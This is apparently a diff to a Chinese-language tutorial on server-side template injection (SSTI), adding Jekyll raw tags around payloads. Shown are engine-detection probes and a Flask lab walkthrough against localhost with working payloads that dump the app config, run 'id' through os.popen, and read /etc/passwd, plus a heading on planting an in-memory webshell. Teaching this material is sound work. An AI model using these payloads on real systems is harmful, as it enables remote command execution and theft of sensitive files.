@@ -151,11 +151,13 @@ http://example.com/greet?name=Alice
 ```
 
 恶意请求：
+{% raw %}
 ```
 http://example.com/greet?name={{7*7}}
 ```
+{% endraw %}
 
-如果页面显示 `49` 而不是 `{{7*7}}`，说明模板表达式被执行，存在SSTI漏洞！
+如果页面显示 `49` 而不是 `{% raw %}{{7*7}}{% endraw %}`，说明模板表达式被执行，存在SSTI漏洞！
 
 #### 安全代码示例
 
@@ -364,6 +366,7 @@ ${7*7}      → Freemarker语法
 
 不同模板引擎有不同的特征：
 
+{% raw %}
 | 模板引擎 | 检测Payload | 预期输出 |
 |---------|------------|---------|
 | Jinja2 | `{{7*7}}` | 49 |
@@ -372,6 +375,7 @@ ${7*7}      → Freemarker语法
 | Freemarker | `${7*7}` | 49 |
 | Velocity | `$class` | - |
 | Django | `{{7|add:7}}` | 14 |
+{% endraw %}
 
 ### 基础利用Payload
 
@@ -715,24 +719,30 @@ if __name__ == '__main__':
 
 #### 漏洞发现
 
+{% raw %}
 1. 访问 `http://localhost:5000/?name={{7*7}}`
+{% endraw %}
 2. 页面显示 `49`，确认存在SSTI
 
 #### 利用过程
 
 **步骤1：信息收集**
 
+{% raw %}
 ```
 http://localhost:5000/?name={{config}}
 ```
+{% endraw %}
 
 获取Flask配置信息。
 
 **步骤2：执行命令**
 
+{% raw %}
 ```
 http://localhost:5000/?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
+{% endraw %}
 
 返回：
 ```
@@ -741,9 +751,11 @@ uid=1000(user) gid=1000(user) groups=1000(user)
 
 **步骤3：读取敏感文件**
 
+{% raw %}
 ```
 http://localhost:5000/?name={{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
 ```
+{% endraw %}
 
 ### 案例2：植入内存马
 
